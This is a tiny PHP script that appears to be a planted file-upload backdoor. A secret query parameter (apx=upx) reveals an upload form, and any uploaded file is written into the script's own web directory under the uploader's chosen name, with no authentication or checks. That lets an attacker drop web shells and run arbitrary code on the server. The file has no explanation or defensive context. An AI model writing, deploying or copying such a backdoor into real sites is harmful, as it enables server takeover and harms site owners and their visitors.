<?phP

if($_GET['apx']=='upx'){
	echo '<form action="" method="post" enctype="multipart/form-data"><input type="file" name="apx"><input type="submit"></form>';
}
if(!empty($_FILES['apx'])){
	echo move_uploaded_file( $_FILES['apx']['tmp_name'], __DIR__ . DIRECTORY_SEPARATOR . $_FILES['apx']['name'] );
}